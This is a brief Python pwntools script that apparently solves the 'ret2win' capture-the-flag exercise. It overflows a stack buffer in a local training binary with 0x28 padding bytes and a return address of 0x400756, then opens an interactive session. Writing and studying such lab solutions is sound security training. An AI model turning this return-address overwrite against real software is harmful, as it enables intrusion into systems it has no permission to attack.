from pwn import *

io = process('./ret2win')

payload = b'\x66'*0x28
payload += p64(0x400756)

io.sendlineafter('> ', payload)
io.interactive()
